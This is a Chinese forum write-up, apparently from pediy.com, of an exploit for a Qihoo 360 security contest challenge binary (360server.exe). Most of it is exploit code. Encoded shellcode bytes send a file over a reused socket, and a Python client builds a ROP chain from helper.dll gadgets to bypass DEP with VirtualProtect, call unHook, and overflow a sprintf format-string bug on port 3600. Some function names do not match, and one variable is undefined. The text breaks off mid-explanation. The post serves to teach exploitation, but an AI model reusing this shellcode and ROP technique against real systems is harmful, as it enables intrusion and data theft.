
# 第三届奇虎 360 安全软件大赛“的第二道题

> 原文：[`www.pediy.com/kssd/pediy12/133246.html`](https://www.pediy.com/kssd/pediy12/133246.html)

## 工作之余，来论坛逛逛，发现近来 Exploit 的话题看似很火，

## 之前本人也没亲自写过 `shellcode` . 正好五一小长假有点时间。

## 也想亲自来分析一个 `Exploit` 。 同时也来和大家分享一下分析过程。

## 那就拿”第三届奇虎 360 安全软件大赛“的第二道题来开刀吧。

## this is `shellcode.py`

### =======size 23===decode====

```
decode_func=chr(0x8d)
decode_func+=chr(0x44)
decode_func+=chr(0x24)
decode_func+=chr(0x23)
decode_func+=chr(0x81)
decode_func+=chr(0xc4)
decode_func+=chr(0xfc)
decode_func+=chr(0xfd)
decode_func+=chr(0xff)
decode_func+=chr(0xff)
decode_func+=chr(0x33)
decode_func+=chr(0xd2)
decode_func+=chr(0xb1)
decode_func+=chr(0x0f)
decode_func+=chr(0x30)
decode_func+=chr(0x0c)
decode_func+=chr(0x10)
decode_func+=chr(0x42)
decode_func+=chr(0x80)
decode_func+=chr(0xfa)
decode_func+=chr(0xf3)
decode_func+=chr(0x76)
decode_func+=chr(0xf7)
```

### =======size 55===probe_socket====

```
probe_socket_func=chr(0x5a)
probe_socket_func+=chr(0x84)
probe_socket_func+=chr(0xe3)
probe_socket_func+=chr(0x8e)
probe_socket_func+=chr(0xe3)
probe_socket_func+=chr(0xc3)
probe_socket_func+=chr(0x0f)
probe_socket_func+=chr(0x0f)
probe_socket_func+=chr(0x0f)
probe_socket_func+=chr(0x3c)
probe_socket_func+=chr(0xd4)
probe_socket_func+=chr(0x65)
probe_socket_func+=chr(0x0f)
probe_socket_func+=chr(0x65)
probe_socket_func+=chr(0x0e)
probe_socket_func+=chr(0x82)
probe_socket_func+=chr(0x4a)
probe_socket_func+=chr(0xf7)
probe_socket_func+=chr(0x5f)
probe_socket_func+=chr(0x5c)
probe_socket_func+=chr(0xf0)
probe_socket_func+=chr(0x1a)
probe_socket_func+=chr(0x5b)
probe_socket_func+=chr(0x0e)
probe_socket_func+=chr(0x4e)
probe_socket_func+=chr(0x0f)
probe_socket_func+=chr(0x8c)
probe_socket_func+=chr(0xf7)
probe_socket_func+=chr(0x0f)
probe_socket_func+=chr(0x72)
probe_socket_func+=chr(0x02)
probe_socket_func+=chr(0x8c)
probe_socket_func+=chr(0xcc)
probe_socket_func+=chr(0x0b)
probe_socket_func+=chr(0x8e)
probe_socket_func+=chr(0xf4)
probe_socket_func+=chr(0x0f)
probe_socket_func+=chr(0x4f)
probe_socket_func+=chr(0x0f)
probe_socket_func+=chr(0x0f)
probe_socket_func+=chr(0x7b)
probe_socket_func+=chr(0x09)
probe_socket_func+=chr(0xe4)
probe_socket_func+=chr(0xd0)
probe_socket_func+=chr(0x84)
probe_socket_func+=chr(0xcc)
probe_socket_func+=chr(0xe4)
probe_socket_func+=chr(0x0c)
probe_socket_func+=chr(0x3c)
probe_socket_func+=chr(0xcf)
probe_socket_func+=chr(0x47)
probe_socket_func+=chr(0x84)
probe_socket_func+=chr(0xea)
probe_socket_func+=chr(0x52)
probe_socket_func+=chr(0xcc)
```

### =======size 188===sent_file_by_socket====

```
sent_file_by_socket_func=chr(0xe7)
sent_file_by_socket_func+=chr(0xb8)
sent_file_by_socket_func+=chr(0x0f)
sent_file_by_socket_func+=chr(0x0f)
sent_file_by_socket_func+=chr(0x0f)
sent_file_by_socket_func+=chr(0x8c)
sent_file_by_socket_func+=chr(0xf7)
sent_file_by_socket_func+=chr(0xf0)
sent_file_by_socket_func+=chr(0x7b)
sent_file_by_socket_func+=chr(0x09)
sent_file_by_socket_func+=chr(0x5f)
sent_file_by_socket_func+=chr(0xe7)
sent_file_by_socket_func+=chr(0x0e)
sent_file_by_socket_func+=chr(0x0f)
sent_file_by_socket_func+=chr(0x0f)
sent_file_by_socket_func+=chr(0x0f)
sent_file_by_socket_func+=chr(0xcc)
sent_file_by_socket_func+=chr(0x5a)
sent_file_by_socket_func+=chr(0x84)
sent_file_by_socket_func+=chr(0xe3)
sent_file_by_socket_func+=chr(0x8e)
sent_file_by_socket_func+=chr(0xe3)
sent_file_by_socket_func+=chr(0xdb)
sent_file_by_socket_func+=chr(0x0b)
sent_file_by_socket_func+=chr(0x0f)
sent_file_by_socket_func+=chr(0x0f)
sent_file_by_socket_func+=chr(0xe7)
sent_file_by_socket_func+=chr(0x06)
sent_file_by_socket_func+=chr(0x0f)
sent_file_by_socket_func+=chr(0x0f)
sent_file_by_socket_func+=chr(0x0f)
sent_file_by_socket_func+=chr(0x5d)
sent_file_by_socket_func+=chr(0x6a)
sent_file_by_socket_func+=chr(0x6e)
sent_file_by_socket_func+=chr(0x6b)
sent_file_by_socket_func+=chr(0x49)
sent_file_by_socket_func+=chr(0x66)
sent_file_by_socket_func+=chr(0x63)
sent_file_by_socket_func+=chr(0x6a)
sent_file_by_socket_func+=chr(0x0f)
sent_file_by_socket_func+=chr(0x67)
sent_file_by_socket_func+=chr(0x17)
sent_file_by_socket_func+=chr(0x0c)
sent_file_by_socket_func+=chr(0x4e)
sent_file_by_socket_func+=chr(0x0f)
sent_file_by_socket_func+=chr(0xf0)
sent_file_by_socket_func+=chr(0x1a)
sent_file_by_socket_func+=chr(0x23)
sent_file_by_socket_func+=chr(0x0f)
sent_file_by_socket_func+=chr(0x4e)
sent_file_by_socket_func+=chr(0x0f)
sent_file_by_socket_func+=chr(0x5f)
sent_file_by_socket_func+=chr(0xf0)
sent_file_by_socket_func+=chr(0x1a)
sent_file_by_socket_func+=chr(0x27)
sent_file_by_socket_func+=chr(0x0f)
sent_file_by_socket_func+=chr(0x4e)
sent_file_by_socket_func+=chr(0x0f)
sent_file_by_socket_func+=chr(0x84)
sent_file_by_socket_func+=chr(0xff)
sent_file_by_socket_func+=chr(0x3c)
sent_file_by_socket_func+=chr(0xcf)
sent_file_by_socket_func+=chr(0x5f)
sent_file_by_socket_func+=chr(0x67)
sent_file_by_socket_func+=chr(0x8f)
sent_file_by_socket_func+=chr(0x0f)
sent_file_by_socket_func+=chr(0x0f)
sent_file_by_socket_func+=chr(0x0f)
sent_file_by_socket_func+=chr(0x65)
sent_file_by_socket_func+=chr(0x0c)
sent_file_by_socket_func+=chr(0x5f)
sent_file_by_socket_func+=chr(0x5f)
sent_file_by_socket_func+=chr(0x67)
sent_file_by_socket_func+=chr(0x0f)
sent_file_by_socket_func+=chr(0x0f)
sent_file_by_socket_func+=chr(0x0f)
sent_file_by_socket_func+=chr(0x8f)
sent_file_by_socket_func+=chr(0xe7)
sent_file_by_socket_func+=chr(0x04)
sent_file_by_socket_func+=chr(0x0f)
sent_file_by_socket_func+=chr(0x0f)
sent_file_by_socket_func+=chr(0x0f)
sent_file_by_socket_func+=chr(0x6c)
sent_file_by_socket_func+=chr(0x35)
sent_file_by_socket_func+=chr(0x53)
sent_file_by_socket_func+=chr(0x3c)
sent_file_by_socket_func+=chr(0x39)
sent_file_by_socket_func+=chr(0x3f)
sent_file_by_socket_func+=chr(0x21)
sent_file_by_socket_func+=chr(0x5b)
sent_file_by_socket_func+=chr(0x57)
sent_file_by_socket_func+=chr(0x5b)
sent_file_by_socket_func+=chr(0x0f)
sent_file_by_socket_func+=chr(0xf0)
sent_file_by_socket_func+=chr(0x1a)
sent_file_by_socket_func+=chr(0x2f)
sent_file_by_socket_func+=chr(0xaf)
sent_file_by_socket_func+=chr(0x4e)
sent_file_by_socket_func+=chr(0x4e)
sent_file_by_socket_func+=chr(0x84)
sent_file_by_socket_func+=chr(0xf7)
sent_file_by_socket_func+=chr(0x3c)
sent_file_by_socket_func+=chr(0xc6)
sent_file_by_socket_func+=chr(0x5e)
sent_file_by_socket_func+=chr(0x82)
sent_file_by_socket_func+=chr(0x9a)
sent_file_by_socket_func+=chr(0xff)
sent_file_by_socket_func+=chr(0xf4)
sent_file_by_socket_func+=chr(0xf0)
sent_file_by_socket_func+=chr(0xf0)
sent_file_by_socket_func+=chr(0x5d)
sent_file_by_socket_func+=chr(0x67)
sent_file_by_socket_func+=chr(0x0f)
sent_file_by_socket_func+=chr(0x0b)
sent_file_by_socket_func+=chr(0x0f)
sent_file_by_socket_func+=chr(0x0f)
sent_file_by_socket_func+=chr(0x82)
sent_file_by_socket_func+=chr(0x92)
```



`sent_file_by_socket_func`+=`chr`(0xf3)
`sent_file_by_socket_func`+=`chr`(0xf4)
`sent_file_by_socket_func`+=`chr`(0xf0)
`sent_file_by_socket_func`+=`chr`(0xf0)
`sent_file_by_socket_func`+=`chr`(0x5c)
`sent_file_by_socket_func`+=`chr`(0x5f)
`sent_file_by_socket_func`+=`chr`(0xf0)
`sent_file_by_socket_func`+=`chr`(0xd9)
`sent_file_by_socket_func`+=`chr`(0x8c)
`sent_file_by_socket_func`+=`chr`(0xf7)
`sent_file_by_socket_func`+=`chr`(0x0f)
`sent_file_by_socket_func`+=`chr`(0x7b)
`sent_file_by_socket_func`+=`chr`(0x1b)
`sent_file_by_socket_func`+=`chr`(0x65)
`sent_file_by_socket_func`+=`chr`(0x0f)
`sent_file_by_socket_func`+=`chr`(0x82)
`sent_file_by_socket_func`+=`chr`(0x8a)
`sent_file_by_socket_func`+=`chr`(0xff)
`sent_file_by_socket_func`+=`chr`(0xf4)
`sent_file_by_socket_func`+=`chr`(0xf0)
`sent_file_by_socket_func`+=`chr`(0xf0)
`sent_file_by_socket_func`+=`chr`(0xf0)
`sent_file_by_socket_func`+=`chr`(0x3f)
`sent_file_by_socket_func`+=`chr`(0x5c)
`sent_file_by_socket_func`+=`chr`(0xf0)
`sent_file_by_socket_func`+=`chr`(0x7a)
`sent_file_by_socket_func`+=`chr`(0x07)
`sent_file_by_socket_func`+=`chr`(0xf0)
`sent_file_by_socket_func`+=`chr`(0x1a)
`sent_file_by_socket_func`+=`chr`(0x5b)
`sent_file_by_socket_func`+=`chr`(0x0e)
`sent_file_by_socket_func`+=`chr`(0x4e)
`sent_file_by_socket_func`+=`chr`(0x0f)
`sent_file_by_socket_func`+=`chr`(0x58)
`sent_file_by_socket_func`+=`chr`(0xf0)
`sent_file_by_socket_func`+=`chr`(0x1a)
`sent_file_by_socket_func`+=`chr`(0x33)
`sent_file_by_socket_func`+=`chr`(0xaf)
`sent_file_by_socket_func`+=`chr`(0x4e)
`sent_file_by_socket_func`+=`chr`(0x4e)
`sent_file_by_socket_func`+=`chr`(0x84)
`sent_file_by_socket_func`+=`chr`(0x4a)
`sent_file_by_socket_func`+=`chr`(0x07)
`sent_file_by_socket_func`+=`chr`(0x86)
`sent_file_by_socket_func`+=`chr`(0x8a)
`sent_file_by_socket_func`+=`chr`(0x6f)
`sent_file_by_socket_func`+=`chr`(0x0c)
`sent_file_by_socket_func`+=`chr`(0x0f)
`sent_file_by_socket_func`+=`chr`(0x0f)
`sent_file_by_socket_func`+=`chr`(0x84)
`sent_file_by_socket_func`+=`chr`(0xea)
`sent_file_by_socket_func`+=`chr`(0x8e)
`sent_file_by_socket_func`+=`chr`(0xca)
`sent_file_by_socket_func`+=`chr`(0x13)
`sent_file_by_socket_func`+=`chr`(0x05)
`sent_file_by_socket_func`+=`chr`(0x0f)
`sent_file_by_socket_func`+=`chr`(0x0f)
`sent_file_by_socket_func`+=`chr`(0x8e)
`sent_file_by_socket_func`+=`chr`(0xcb)
`sent_file_by_socket_func`+=`chr`(0x23)
`sent_file_by_socket_func`+=`chr`(0x0c)
`sent_file_by_socket_func`+=`chr`(0x0f)
`sent_file_by_socket_func`+=`chr`(0x0f)
`sent_file_by_socket_func`+=`chr`(0x67)
`sent_file_by_socket_func`+=`chr`(0x3a)
`sent_file_by_socket_func`+=`chr`(0x24)
`sent_file_by_socket_func`+=`chr`(0x4f)
`sent_file_by_socket_func`+=`chr`(0x0f)
`sent_file_by_socket_func`+=`chr`(0xcc)
`sent_file_by_socket_func`+=`chr`(0x30)

`xorvalue`=0x0f
`probe_socket_func_len`=0x37
`sent_file_by_socket_func_len`=0xbc

# the follow is client.py

```python
import socket
import sys
from shellcode import *
import time

host_ip="127.0.0.1"

if len(sys.argv)==1:
  print "usages:\n\tpython %s ip_address"%sys.argv[0]
  print "for example:\n\tpython client-004.py 192.168.173.130"
  quit()

host_ip=sys.argv[1]

fill_value = 0x20202020

def sent_1024_bytes(sock):
  data = "PASS:Error _-_-Client000000000"
  sock.send(data + "\n")
  received = sock.recv(1024)

def build_dword(val):
  data=chr(val&0xff)
  data+=chr((val>>8)&0xff)
  data+=chr((val>>16)&0xff)
  data+=chr((val>>24)&0xff)
  return data

def skip_dword(val):
  return build_dword(val)

def set_eax_zero():
  return build_dword(0x41418938)
  return data

def set_eax(val):
  if val == 0:
    return set_eax_zero()
  else:
    data=""
    data+=build_dword(0x4141294a)
    data+=build_dword(val)
    data+=skip_dword(fill_value)
    return data

def set_ebx(val):
  data=build_dword(0x41419e69)
  data+=build_dword(val)
  return data

def set_ecx(val):
  data=build_dword(0x41411505)
  data+=build_dword(val)
  return data

def set_edx(val):
  data=set_esi(val)
  data+=build_dword(0x41415595)
  data+=skip_dword(fill_value)
  data+=skip_dword(fill_value)
  data+=skip_dword(fill_value)
  data+=skip_dword(fill_value)
  return data

def set_esi(val):
  data=build_dword(0x414118d4)
  data+=build_dword(val)
  return data

def set_edi(val):
  data=build_dword(0x414153c3)
  data+=build_dword(val)
  return data

def mov_eax_ecx():
  data=build_dword(0x41416b63)
  return data

def mov_eax_esi(val):
  data=build_dword(0x41411b85)
  data+=skip_dword(fill_val)     
  data+=skip_dword(fill_val)
  data+= val[0]
  data+= val[1]
  data+= val[2]
  data+= val[3]
  data+=skip_dword(fill_val)
  data+=val[4:]
  return data

def mov_ecx_eax():
  data=build_dword(0x414129f2)
  data+=build_dword(0x41418a27)
  return data

def get_org_ebp():
  data=build_dword(0x41418a27)
  data+=mov_eax_ecx()
  return data

def get_org_ebp_to_cex():
  return build_dword(0x41418a27)

def write_dword(addr,val):
  data=set_ecx(addr)
  data+=set_eax(val)
  data+=build_dword(0x41418683)
  data+=skip_dword(fill_value)
  return data

def write_eax_to_memory(addr):
  data=set_ecx(addr)
  data+=build_dword(0x41418683)
  data+=skip_dword(fill_value)
  return data

def write_eax_to_cex_memory():
  data=build_dword(0x41418683)
  data+=skip_dword(fill_value)
  return data

def read_dword(addr):
  data=set_eax(addr)
  data+=build_dword(0x414199c3)
  data+=skip_dword(fill_value)
  data+=skip_dword(fill_value)
  return data

def read_from_eax_memory():
  data=build_dword(0x414199c3)
  data+=skip_dword(fill_value)
  return data

def write_al_to_memory(address):
  data=set_ecx(addr)     
  data+=build_dword(0x41411086)
  data+=skip_dword(fill_value)
  return data

def write_al_to_cex_memory():
  data=build_dword(0x41411086)
  data+=skip_dword(fill_value)
  return data

def set_eax_zero():
  return build_dword(0x41418938)

def memory_add(addr,value):
  data=set_esi(addr)
  data+=set_eax(value)
  data+=build_dword(0x41411bff)
  data+=skip_dword(fill_value)
  data+=skip_dword(fill_value)
  data+=skip_dword(fill_value)
  return data

def memory_add_eax(addr):
  data=set_esi(addr)
  data+=build_dword(0x41411bff)
  data+=skip_dword(fill_value)
  data+=skip_dword(fill_value)
  data+=skip_dword(fill_value)
  return data

def save_ebp_to_fs_zero():
  data=set_eax(0)
  data+=build_dword(0x414129c8)
  data+=skip_dword(fill_value)
  data+=skip_dword(fill_value)
  data+=build_dword(0x41411301)        
  data+=skip_dword(fill_value)
  return data

def get_seh_chain_to_cex():
  data=build_dword(0x41418a27)  
  return data

def write_eax_to_memory_with_esi(addr):
  data=set_esi(addr)
  data+=build_dword(0x41413196)  
  data+=skip_dword(fill_value)
  data+=skip_dword(fill_value)
  return data

def mov_eax_esi():
  data=build_dword(0x41412e57)  
  data+=skip_dword(fill_value)
  return data

def inc_eax():
  return build_dword(0x41418418)  

def add_eax_4():
  data=inc_eax()
  data+=inc_eax()
  data+=inc_eax()
  data+=inc_eax()
  return data

def add_eax_c():
  return build_dword(0x4141298b)  

def add_eax_8():
  return build_dword(0x41412978)  

def call_unhook():
  return build_dword(0x414114e0)  
```



## Shellcode 构造代码

```python
def call_VirtualProtect():
    return build_dword(0x41411563)

def switch_stack_execute(next_shellcode):
    data=build_dword(0x414198bb)
    data+=next_shellcode
    return data

def restore_org_SEH_chain():
    return build_dword(0x414129f2)

def nouse_func():
    return build_dword(0x414168fc)

global_off      = 0x158
mem_var_org_ebp      = 0x4141fff0      # in the address save a variable of the shellcode
temp_variable      = 0x4141ff80      # when we call VirtualProtect function ,this variable will be used
org_SEH_chain_header_ptr  = 0x4141ff40      # in the address save the original SEH chain header

shellcode      = ""
shellcode += get_seh_chain_to_ecx()        # save original SEH chain header
shellcode += mov_eax_ecx()
shellcode += set_ecx(org_SEH_chain_header_ptr)
shellcode += write_eax_to_ecx_memory()
shellcode += save_ebp_to_fs_zero()                              # get current esp register value then save it to FS:[0]
shellcode += get_seh_chain_to_ecx()
shellcode += mov_eax_ecx()
shellcode += write_eax_to_memory(mem_var_org_ebp)    # save starting esp of the shellcode to memory variable
shellcode += memory_add(mem_var_org_ebp,-(global_off))
shellcode += read_dword(mem_var_org_ebp)
shellcode += mov_ecx_eax()
shellcode += write_eax_to_ecx_memory()        # the lpAddress parameter of the VirtualProtect function
shellcode += add_eax_4()
shellcode += mov_ecx_eax()
shellcode += read_dword(0x414101bc)        # read value from original memory of this process, this value is 0x40
shellcode += write_eax_to_ecx_memory()        # the dwSize parameter of the VirtualProtect function
shellcode += read_dword(mem_var_org_ebp)
shellcode += add_eax_8()
shellcode += mov_ecx_eax()
shellcode += read_dword(0x414101bc)        # read value from original memory of this process, this value is 0x40
shellcode += write_eax_to_ecx_memory()        # the flNewProtect parameter of the VirtualProtect function
shellcode += read_dword(mem_var_org_ebp)
shellcode += add_eax_c()
shellcode += mov_ecx_eax()
shellcode += set_eax(temp_variable)        
shellcode += write_eax_to_ecx_memory()        # the lpflOldProtect parameter of the VirtualProtect function
shellcode += read_dword(mem_var_org_ebp)
shellcode += add_eax_c()
shellcode += add_eax_8()
shellcode += add_eax_8()
shellcode += mov_ecx_eax()
shellcode += add_eax_8()          # this is key point, you must change this code if you change global_off
shellcode += add_eax_8()
shellcode += write_eax_to_ecx_memory()        # set entry point after execute VirtualProtect
shellcode += read_dword(org_SEH_chain_header_ptr)
shellcode += restore_org_SEH_chain()
shellcode += call_unhook()          # call helper.unHook
shellcode += memory_add(mem_var_org_ebp,-4)
shellcode += read_dword(mem_var_org_ebp)
shellcode += switch_stack_execute(call_VirtualProtect())  # call VirtualProtect
```

```python
print "shellcode=%d"%len(shellcode)

HOST, PORT = host_ip, 3600
# Create a socket (SOCK_STREAM means a TCP socket)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Connect to server and send data
sock.connect((HOST, PORT))

data = "PASS:Error _-_-Client%s000"
i=len(data)
print "decode_func size is %d" % (len(decode_func))
data+=decode_func
print "sent_file_by_socket_func size is %d" % (len(sent_file_by_socket_func))
data+=sent_file_by_socket_func
print "probe_socket_func size is %d" % (len(probe_socket_func))
data+=probe_socket_func
i=len(data)
i=len(data)
print "\nchar '0' position is %d"%i
while i < 294:
  data +="0"
  i+=1
data+=shellcode
data+=chr(0x0)
print "len(data)= %d" % len(data)
sock.send(data )

# Receive data from the server and shut down
received = sock.recv(1024)
print "Received: %s" % received
print ""
print ""
sock.send("PASS:Error _-_-Client00000")
received = sock.recv(1024)
# Receive data from the server and shut down
sock.send("PASS:Error _-_-Client00000")
received = sock.recv(1024)
print "Received 360.txt context is : '%s'" % received
sock.send("PASS:Error _-_-Client00000")
received = sock.recv(1024)
time.sleep(5)
sock.close()
```

## 分析过程

我们可以分一下几步完成这个分析过程

### 第一步 寻找溢出点

### 第二步 分析 `shellcode` 需要完成的功能需求

### 第三步 去构造 `shellcode`

### 第一步 寻找溢出点

万事开头难，对于 `Exploit` 来说，一切源于溢出点的定位。如果连溢出点都无法定位，就不用考虑写 `shellcode` 的问题了。

那只是浪费时间了。寻找溢出点，就是一个体力活，也只能通过 `IDA` 来反汇编，然后慢慢的寻找了。当然了反汇编的功底

也是出题人第一考点。如果反汇编这关过不了，那就不要试着写 `shellcode` 了。`360server.exe` 程序只有 71K ，是一个

很简单的程序，分析起来也相当简单。这个程序的大概功能如下：

数据包的格式如下：

`offset 0` `PASS:ErrorXXXXX` // 这里的 `XXXXX` 可以是任意字符  
`offset 15` `ClientXXX` // 这里的 `XXX` 可以是任意字符 这个字段的前 8 个字符将要被写到 `config.ini` 文件的  
`Config` 节的 `Info1` 这个字段里面  
`offset 24-1023` 从这里开始可以是任意字符 // 这里的数据将要被写到 `config.ini` 文件的 `Config` 节的 `Info2` 这个字段里面  
// 由于是通过 `WritePrivateProfileStringA` 函数写入的，所以如果数据中出现字符  
`0,\r,\n` 将要被截断  
// `offset 224-1023` 之间必须包含一个字符 `'0'` 用来代表数据包的合法行

下面是原始的 `config.ini` 文件

`config.ini` 文件

```
[Authorization]
Passwd=902B0D55 FDDEF6F8 D651FE10 35B7D4BD
[Config]
Jiraiya=JustForFun
Info1=Client ；这个字段根据用户数据包更新
Info2=Login... ；这个字段根据用户数据包更新
Info3=Wait for client...
```

通过 `IDA` 的分析，漏洞是发生在 `360server.exe` 的 `00402600` 函数里面的 `sprintf` 函数调用。

```
.text:0040272B lea eax, [ebp+var_500_Info2ReturnedString]
.text:00402731 push eax
.text:00402732 lea ecx, [ebp+var_550_Info1ReturnedString] ；这里格式化串是从 config.ini 文件中读出，
.text:00402738 push ecx             ; char *
.text:00402739 lea edx, [ebp+var_110]
.text:0040273F push edx             ; char *
.text:00402740 call _sprintf
.text:00402745 add esp, 0Ch  0x13faa8
```

```
config.ini 文件
[Authorization]
Passwd=902B0D55FDDEF6F8D651FE1035B7D4BD
[Config]
Jiraiya=JustForFun
Info1=Client ；这个字段根据用户数据包更新
Info2=Login... ；这个字段根据用户数据包更新
Info3=Wait for client...
```

我们在数据包中构造一个 `Info1=Client%s`

`shellcode` 代码在 `Info2="你的 shellcode 都在这里"`

```
ebp+40  | socket handle |        | 这个 socket 句柄将要被覆盖
| .... |        |
ebp+1c  | 上层函数的局域变量开始 |        |
ebp+18  | 函数 0x402600 参数 4 |        |
ebp+14  | 函数 0x402600 参数 4 |        |
ebp+10  | 函数 0x402600 参数 3 |        |
ebp+c   | 函数 0x402600 参数 2 |        |
ebp+8   | 函数 0x402600 参数 1 |        |
溢出点 ebp+4 | call return address |        | 数据包偏移的第 294 字节开始将覆盖掉上层函数调用的返回地址
| 0x00402b35 |        |
```



# 堆栈布局

`ebp` | 上一层函数的 `EBP` | | |  
| .... | | | |  
| .... | | | |  
`ebp-110` | `ClientXXXXXXXX` | | `XXXXXXXXX` 开始的位置对应到 数据包的偏移 24 开始 |  

## 第二步 分析 `shellcode` 需要完成的功能需求

由于系统开启了 `DEP` 保护功能，并且 `360server.exe` 调用了 `SetProcessDEPPolicy` 这个函数开启了进程的 `DEP` 保护，所以数据段和堆栈段都不能执行代码，首先要解决数据或堆栈段可执行的问题。

第二个需求读取 `c:\\360.txt` 文件问题。`360server.exe` 通过调用 `helper.dll` 中的函数与 `bprot.sys` 驱动通讯，拒绝访问 `c:\\360.txt`。

同时我们也看到 `helper.dll` 中也提供了一个 `unHook` 导出函数，去除对 `c:\\360.txt` 文件的访问保护。第二个需求就是我们的 `shellcode` 需要去调用 `helper.dll` 中的 `unHook` 函数。同时我们也发现 `360server.exe` 调用了 `helper.dll` 中的 `Helpyou` 的一个导出函数。在 `Helpyou` 函数中调用 `VirtualProtect` 函数，`VirtualProtect` 函数可以改变数据段或堆栈段的属性，让这些段变成可执行的段

我们也可以发现 `helper.dll` 的模块基地址是 `41410000` 开始，这就让我们可以把这个模块中的地址放到 溢出的堆栈中，`402600` 函数执行到反回时，跳转到 `helper.dll` 中的某个地址执行指令。例如：

`ebp+40` | `socket handle` | | 这个 `socket` 句柄将要被覆盖  
| .... | | |  
`ebp+1c` | 上层函数的局域变量开始 | |  
`ebp+18` | 函数 `0x402600` 参数 4 | |  
`ebp+14` | 函数 `0x402600` 参数 4 | |  
`ebp+10` | 函数 `0x402600` 参数 3 | |  
`ebp+c` | 函数 `0x402600` 参数 2 | |  
`ebp+8` | 函数 `0x402600` 参数 1 | |  
`ebp+4` | `call return address` | | 我们可以在第 294 个字节开始的 `Dword` 设置为 `unHook` 的地址 |  
| `0x00402b35` | | |  
`ebp` | 上一层函数的 `EBP` | |  
| .... | | |  
| .... | | |  
`ebp-110` | `ClientXXXXXXXX` | | `XXXXXXXXX` 开始的位置对应到 数据包的偏移 24 开始 |  

```asm
.text:00402600                  push    ebp
.text:00402601                  mov     ebp, esp
.text:00402603                  sub     esp, 550h
.text:00402609                  mov     [ebp+var_4], 0
                               .....
                               .....
.text:0040278C                  mov     esp, ebp
.text:0040278E                  pop     ebp
.text:0040278F                  retn
```

在上面的堆栈情况下 当指令执行到 `403600` 函数的返回语句 `40278f` 的 `ret` 的时候，`cpu` 将要去执行 `unHook` 函数

我们可以通过在堆栈中放入 代码段的地址，来达到控制 `cpu` 的目的。为了解决第一个需求问题，我们就需要构造一个 `VirtualProtect` 函数调用，

第三个需求 在利用漏洞的时候只能使用 `3600` 这个 `socket` 端口传送数据。也就是说我们必须使用程序原始的 `socket` 端口，但是我们不难发现在 `ebp+40` 的堆栈位置中保存的是原始的 `socket` 句柄。我们很难在 `ebp` 到 `ebp+40` 的这 64 个字节中完成所有的功能，这里必然是要被我们的 `shellcode` 覆盖的。那我们如何使用原始的 `socket` 句柄呢，那只能使用曲线救国的办法。我们从 `0` 到 `ffffffff` 测试 `socket` 端口的可用性，都过调用 `sent` 判断返回值的方法，去找回原始的 `socket`. 种方法可以解决这个问题

第四个需求 如何精确定位自己的 `shellcode` 代码的问题。也就是说我们如果成功的构造了 `VirtualProtect` 的函数掉用。如果去跳转到你的 `shellcode`. 因为我们的 `shellcode` 都保存在堆栈中，在堆栈的 `ebp-110` 开始的 1024 个自己处，为了精确去定位自己的 `shellcode`, 我们必须获得溢出时的 `esp` 寄存器的值。因为在执行 `VirtualProtect` 函数前，我们无法在堆栈中直接执行我们的 `shllcode` 的。只能工作在堆栈的某些位置放入 `helper.dll` 的某些执行地址，然后继续精确控制地址的返回，来调整堆栈中的数据方式。控制 `cpu` 流程。

我们能可以找到 `helper.dll` 中的 `414129c8` 开始的代码片段，可以把当前的 `esp` 保存到 `fs:0` 中。就是说只要我们把 `402600` 函数返回地址覆盖成 `414129c8`, 我就相当于调用了 保存 `esp` 到 `fs:0` 的功能。

```asm
.text:414129C8                  lea     ebp, [esp+8+arg_4]
.text:414129CC                  sub     esp, eax                  //这里 eax 必须是 0
.text:414129CE                  push    ebx
.text:414129CF                  push    esi
.text:414129D0                  push    edi
.text:414129D1                  mov     eax, ___security_cookie
.text:414129D6                  xor     [ebp-4], eax
.text:414129D9                  xor     eax, ebp
.text:414129DB                  push    eax
.text:414129DC                  mov     [ebp-18h], esp
.text:414129DF                  push    dword ptr [ebp-8]
.text:414129E2                  mov     eax, [ebp-4]
.text:414129E5                  mov     dword ptr [ebp-4], 0FFFFFFFEh
.text:414129EC                  mov     [ebp-8], eax
.text:414129EF                  lea     eax, [ebp-10h]
.text:414129F2                  mov     large fs:0, eax
.text:414129F8                  retn
```

上面的代码调用的时候如何保证 `eax` 的值零呢。同样我们可以在 `helper.dll` 中找到下面的代码片段

```asm
.text:41418938                  xor     eax, eax
.text:4141893A                  retn
```

如果我们在溢出点的堆栈中放入下面的数据就能完成上面需要的功能

`esp+18` | 下条指令地址 | |  
`esp+14` | `xxxxxxxxxx` | |  
`esp+10` | `0x41411301` | |  
`esp+c` | `xxxxxxxxxx` | |  
`esp+8` | `xxxxxxxxxx` | |  
`esp+4` | `0x414129c8` | |  
溢出点 `esp` | `0x41418938` | | 数据包偏移的第 294 字节开始将覆盖掉上层函数调用的返回地址 |

上面的堆栈情况在 `.text:0040278F retn` 被执行的时候

将执行以下的执行序列：

```asm
.text:41418938                  xor     eax, eax
.text:4141893A                  retn                  //这个 ret 执行的时候 esp 对应到 [溢出点+4] 0x414129c8
.text:414129C8                  lea     ebp, [esp+8+arg_4]
.text:414129CC                  sub     esp, eax                  //这里 eax 必须是 0
.text:414129CE                  push    ebx
.text:414129CF                  push    esi
.text:414129D0                  push    edi
.text:414129D1                  mov     eax, ___security_cookie
.text:414129D6                  xor     [ebp-4], eax
.text:414129D9                  xor     eax, ebp
.text:414129DB                  push    eax
.text:414129DC                  mov     [ebp-18h], esp
.text:414129DF                  push    dword ptr [ebp-8]
.text:414129E2                  mov     eax, [ebp-4]
.text:414129E5                  mov     dword ptr [ebp-4], 0FFFFFFFEh
.text:414129EC                  mov     [ebp-8], eax
.text:414129EF                  lea     eax, [ebp-10h]
.text:414129F2                  mov     large fs:0, eax
.text:414129F8                  retn                //这个 ret 执行的时候 堆栈中的数据是 0x41411301
.text:41411302                  add     esp, 1Ch
.text:41411305                  retn                //这个 ret 执行的时候 堆栈中的数据是 "下条指令地址"
```

通过溢出堆栈中的数据 控制 `cpu` 的流程就是想上面那样完成的。

控制 `cpu` 流程的原理大家已经清楚了。接下来就是在 `helper.dll` 中发现某系地址，通过这些地址完成某些你需要完成的功能。例如给 寄存器 `eax`,`ebx`,`ecx`,`edx`,`esi`,`edi` 赋值等。

同时你可以把这些地址定义成函数。这样便于写 `shellcode` 的时候去引用这些功能。

你可在我写的 `python` 的代码中，找到我在 `helper.dll` 中定位到的一些特定地址。

例如：

`set_eax(val)`

```asm
.text:4141294A                  pop     eax
.text:4141294B                  pop     ebp
.text:4141294C                  retn
```

`set_ebx(val)`

```asm
.text:41419E93                  pop     ebx
.text:41419E94                  retn
```

如果想为 `eax` 设置一个值为 `0x50404046` 你只要在堆栈中构造如下数据就可以了



